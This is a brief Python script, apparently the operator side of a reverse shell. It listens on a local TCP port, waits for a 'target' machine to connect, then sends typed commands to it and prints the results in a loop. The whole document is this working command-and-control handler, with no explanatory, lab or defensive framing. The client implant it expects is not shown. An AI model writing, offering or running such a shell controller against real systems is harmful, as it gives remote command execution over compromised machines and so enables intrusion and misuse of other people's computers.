import socket

sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sc.bind(("127.0.0.1", 12345))
sc.listen(5)
print("Listening for Incoming connection")
target, ip = sc.accept()
print("Target connected")

while True:
    command = input("* Shell ~%s:" % str(ip))
    bytes1 = bytes(command, 'utf-8')
    target.send(bytes1)
    if command == "q":
        break
    else:
        result = target.recv(1024)
        print(result.decode(("utf-8")))

sc.close()
